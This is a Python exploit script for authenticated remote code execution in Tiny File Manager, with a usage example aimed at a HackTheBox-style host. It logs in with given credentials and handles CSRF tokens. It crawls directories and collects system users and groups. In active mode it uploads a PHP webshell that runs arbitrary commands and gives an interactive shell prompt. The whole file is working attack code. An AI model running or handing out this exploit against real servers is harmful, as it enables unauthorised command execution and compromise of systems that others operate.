import requests
from bs4 import BeautifulSoup
import re
import argparse
import signal
import sys

parser = argparse.ArgumentParser(
    description='Tiny File Manager authenticated RCE\nThe passive mode is set by default.',
    usage='%(prog)s -rhost victim_url -u user -p password\nExample: %(prog)s -rhost http://soccer.htb -u admin -p admin@123' 
)
parser.add_argument('-rhost', '--remote_host', dest='victim_url', required=True, help='url you are attacking to. Example: http://123.222.233.11 or http://domainname.com')
parser.add_argument('-u', '--user', dest='entered_user', required=True, help='Username for login in. Example: admin')
parser.add_argument('-p', '--password', dest='entered_password', required=True, help='Password for login in. Example: 1234')
parser.add_argument('-act', '--active', dest='active', action='store_true', help='ACTIVE MODE -> It will try to attack every posible vector to gain a revers shell.')

args = parser.parse_args()
remote_url = args.victim_url
user = args.entered_user
password = args.entered_password


url_web_root = f'http://{remote_url.split("/")[2]}/'
url_default_upload = f'{remote_url}?p=&upload'
url_upload_content = f'{remote_url}?p='
file_upload_web_root = ''


def signal_handler(signum, frame):
    if signum == signal.SIGINT:
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
session = requests.Session()


def retrieve_file_upload_web_root(url):
    global file_upload_web_root
    upload_site_response = session.request(method='GET', url=url)

    soup = BeautifulSoup(upload_site_response.text, 'html.parser')
    folder_info_tag = soup.find('p', class_='card-text')

    if folder_info_tag:
        folder_info = folder_info_tag.get_text(strip=True)
        folder_path_match = re.search(r'Destination Folder: (.+)', folder_info)

        if folder_path_match:
            file_upload_web_root = folder_path_match.group(1)
            return True
    return False


def get_webshell_access(web_path):
    craft_webshell_url = url_web_root + web_path + "/webshell.php"
    r = session.request(method='GET', url=craft_webshell_url)
    
    if r.status_code == 200:
        while True:
            command = input('->')

            command_response = session.request(method='GET', url=craft_webshell_url + f'?cmd={command}')
            if command_response.status_code == 200:
                print(command_response.text)
            else:
                print("Commando no valido")


def upload_webshell(url, token=None, current_web_root=None):

    # BASIC PHP WEBSHELL
    webshell = b"<?php echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; ?>"

    file = {
        "file": ("webshell.php", webshell)
    }

    file_data = {
        "fullpath": "webshell.php"
    }

    r = session.request(method='GET', url=url)

    if token:
        soup = BeautifulSoup(r.text, 'html.parser')
        form = soup.find('form', class_='dropzone card-tabs-container')

        # Si no se encuentra por clase, buscar por ID
        if form is None:
            form = soup.find('form', id='fileUploader')

        hidden_fields = form.find_all('input',{'type': 'hidden'})
        for hidden_field in hidden_fields:
            if hidden_field.get('name') == 'token':
                file_data['token'] = hidden_field.get('value')

    upload_response = session.request(method="POST", url=url, data=file_data, files=file)
    if upload_response.status_code == 200:
        check_upload = folder_recon(url_upload_content + current_web_root, check_webshell="yes")
        if check_upload:
            print(check_upload)
            get_webshell_access(current_web_root)


def get_create_token(html_text):

    soup = BeautifulSoup(html_text, 'html.parser')

    # Encuentra la etiqueta <script> y extrae el contenido dentro de ella
    script_tag = soup.find('script', {'type': 'text/javascript'})
    if script_tag:
        # Obtén el contenido dentro de la etiqueta <script>
        script_content = script_tag.string

        # Extrae el valor del token usando expresiones regulares
        import re
        match = re.search(r"window.csrf = '(.+?)';", script_content)
        if match:
            return match.group(1)


#GET /tiny/tinyfilemanager.php?p=&new=test&type=folder
def try_create_folder_or_file(url_path, type, token=None):

    if token:
        data = {
            'newfile': f'{type}'
        }

        token = get_create_token(session.request(method='GET', url=url_upload_content).text)

        if type == 'file':
            data['newfilename'] = 'test.txt'
            data['token'] = token

            create_file_response = session.request(method='POST', url=url_upload_content + url_path, data=data)
            if "Cannot open file:  test.txt" in create_file_response.text:
                print("File not created")
                return
            print("File created.")
            upload_webshell(url_upload_content + url_path + '&upload', token='yes', current_web_root=url_path)
            sys.exit(0)

        else:
            data['newfilename'] = 'test'
            data['token'] = token

            create_folder_response = session.request(method='POST', url=url_upload_content + url_path, data=data)
            if "Folder <b>test</b> not created" in create_folder_response.text:
                print("Folder not created")
                return
            print("Folder created.")
            try_create_folder_or_file(url_path + "test", 'file', token='yes')
            sys.exit(0)
    else:
        if type == 'file':
            create_url_file = url_upload_content + url_path + f'&new=test.txt&type=file'
            create_file_response = session.request(method='GET', url= create_url_file)

            if "Cannot open file:  test.txt" in create_file_response.text:
                print("File not created")
                return
            print("File created.")
            upload_webshell(url_upload_content + url_path + '&upload', current_web_root=url_path)
            sys.exit(0)
        else:
            create_url_folder = url_upload_content + url_path + f'&new=test&type=folder'
            create_folder_response = session.request(method='GET', url= create_url_folder)

            if "Folder <b>test</b> not created" in create_folder_response.text:
                print("Folder not created")
                return
            print("Folder created.")
            try_create_folder_or_file(url_path + "test", 'file')
            sys.exit(0)


def folder_recon(url, check_webshell=None):
    folders = []
    num_files = ''
    num_folders = ''

    check_uploads_response = session.request(method="POST", url=url)

    soup = BeautifulSoup(check_uploads_response.text, 'html.parser')
    upload_table = soup.find('table', class_='table table-bordered table-hover table-sm bg-white')
    upload_table_text = upload_table.get_text(strip=True)
    if not 'Folder is empty' in upload_table_text:
        rows = upload_table.find_all('tr')
        all_rows_with_data = []
        for row in rows:
            cells = row.find_all('td')
            table_files = [cell.get_text(strip=True) for cell in cells]
            all_rows_with_data.append(table_files)
        # input(all_rows_with_data)
        for index, row_data in enumerate(all_rows_with_data):
            if check_webshell:
                for data in row_data:
                    if "webshell.php" in data:
                        # folders.append({"content": (row_data[1], row_data[4], row_data[5])})
                        return True
            if row_data:
                if index == len(all_rows_with_data) - 1:
                    files_and_folders = row_data[0].split('File:')[1]
                    num_files = files_and_folders.split('Folder:')[0]
                    num_folders = files_and_folders.split('Folder:')[1]
                    break

                if row_data[0] == '':
                    folders.append({"content": (row_data[1], row_data[2], row_data[4], row_data[5])})
                else:
                    folders.append({"content": (row_data[0], row_data[1], row_data[3], row_data[4])})
    return num_files, num_folders, folders


class Spider:

    def __init__(self, url, system_web_root, token=None, active_mode=None):
        self.url = url
        self.system_web_root = system_web_root
        self.token = token
        self.active_mode = active_mode
        self.total_files = 0
        self.total_folders = 0
        self.folder_paths = []
        self.system_users = []
        self.system_groups = []

        # Default check
        num_files, num_folders, folder_content = folder_recon(self.url)

        folders = self.filter_folder(num_files, num_folders, folder_content)
        if folders:
            self.start_crawling(folders)


    def filter_folder(self, num_files, num_folders, folder_content):
        if num_files:
            self.total_files += int(num_files)
        if num_folders:
            self.total_folders += int(num_folders)
        subfolders = []
        # {'content': ('data', 'Folder', '0755', 'root:root')}
        for content in folder_content:
            user_group = content['content'][3]
            if user_group:
                user = user_group.split(':')[0]
                if user not in self.system_users:
                    self.system_users.append(user)

                group = user_group.split(':')[1]
                if group not in self.system_groups:
                    self.system_groups.append(group)

            if content['content'][1]:
                if content['content'][1] == 'Folder':
                    subfolders.append(content)
        return subfolders


    # permisos de escritura
    # 010 - 2
    # 011 - 3
    # 110 - 6
    # 111 - 7
    def check_permissions_and_subfolders(self, folder):

        current_path = folder['content'][0]
        self.folder_paths.append(current_path)
        # ACTIVE MODE
        if self.active_mode:
            if self.token:
                try_create_folder_or_file(current_path, 'file', token='yes')
                try_create_folder_or_file(current_path, 'folder', token='yes')
            else:
                try_create_folder_or_file(current_path, 'file')
                try_create_folder_or_file(current_path, 'folder')

        # gather subfolders
        num_files, num_folders, folder_content = folder_recon(self.url + current_path)
        return self.filter_folder(num_files, num_folders, folder_content)

    # Recursive Directory crawling
    def start_crawling(self, folders):
        processed_folders = []
        index = 0
        for f in folders:
            #print(str(index) + "\t" + str(folders[index]) + "\t" + str(folders) + "\t" + str(len(folders)))
            if f in processed_folders:
                index += 1
                continue

            subfolders = self.check_permissions_and_subfolders(f)
            if subfolders:
                processed_folders.append({f['content'][0]: [*subfolders]})
            index += 1

        new_folders = []
        for item in processed_folders:
            f_name = list(item.keys())[0]
            for sub_f in item[f_name]:
                new_folders.append({'content':(f_name + "/" + sub_f['content'][0],sub_f['content'][1])})
        if new_folders:
            self.start_crawling(new_folders)


def get_token_from_html(html_text):        
    soup = BeautifulSoup(html_text, 'html.parser')
    return soup.find('input', {'name': 'token'}).get('value')


def login(user, password):

    token = False
    r1 = session.request(method='GET', url=remote_url)

    creds = {
        "fm_usr": user,
        "fm_pwd": password
    }

    # CHECK CSRF TOKEN
    if "<input type=\"hidden\" name=\"token\" value=" in r1.text:        
        creds['token'] = get_token_from_html(r1.text)
        token = True

    r2 = session.request(method='POST', url=remote_url, data=creds)

    if r2.status_code == 200 and "Upload" in r2.text:
        if token:
            # print("Logged in with token.")
            return True
        else:
            # print("Logged in.")
            return False
    
    print("Loggin failed. Wrong credentials.")
    sys.exit(0)


if __name__ == "__main__":

    #LOGGIN
    is_token = login(user, password)

    # BASIC INFORMATION CHECK
    # VERSION & SYSTEM WEB ROOT LEAK
    first_r = session.request(method='GET', url=url_upload_content)
    soup = BeautifulSoup(first_r.text, 'html.parser')
    version = soup.find('a', class_='float-right text-muted')
    print()
    print('VERSION: ' + version.text)

    if retrieve_file_upload_web_root(url_default_upload):
        print("System web root dicovered: " + str(file_upload_web_root))

    # CHECK DEFAULT MANUALLY
    if args.active:
        if is_token:
            try_create_folder_or_file("", 'file', token='yes')
            try_create_folder_or_file("", 'folder', token='yes')
        else:
            try_create_folder_or_file("", 'file')
            try_create_folder_or_file("", 'folder')
        
        if is_token:
            spider = Spider(url_upload_content, file_upload_web_root, token='yes', active_mode='yes')
        else:
            spider = Spider(url_upload_content, file_upload_web_root, active_mode='yes')

    # START RECON
    print("Finding...")
    if is_token:
        spider = Spider(url_upload_content, file_upload_web_root, token='yes')
    else:
        spider = Spider(url_upload_content, file_upload_web_root)
    print(f'Total files: {spider.total_files} Total folders: {spider.total_folders}')
    print('\nDirectories found')
    for discovered_folder in spider.folder_paths:
        print(discovered_folder)

    print('\nFound system Users')
    print(f'Total users: {len(spider.system_users)}')
    for u in spider.system_users:
        print(u)
    
    print('\nFound system Groups')
    print(f'Total groups: {len(spider.system_groups)}')
    for g in spider.system_groups:
        print(g)

        # migth check for suid bit
        # self.folder_paths.append(folder['folder'][0])
        # last_bit = int(folder['folder'][1][-1])
        # if last_bit == 7 or last_bit == 6 or last_bit == 3 or last_bit ==2:
        #     crafted_url = url_upload_content + folder['folder'][0]
        #     upload_webshell(crafted_url + '&upload', token='yes')
        #     check_upload = check_upload_files(crafted_url, check_all="yes")
        #     if check_upload:
        #         print(check_upload)
        #         get_webshell_access(folder['folder'][0])
        #         sys.exit(0)
        #     else:
        #         print("No se a podido subir la webshell. Probando con mas...")
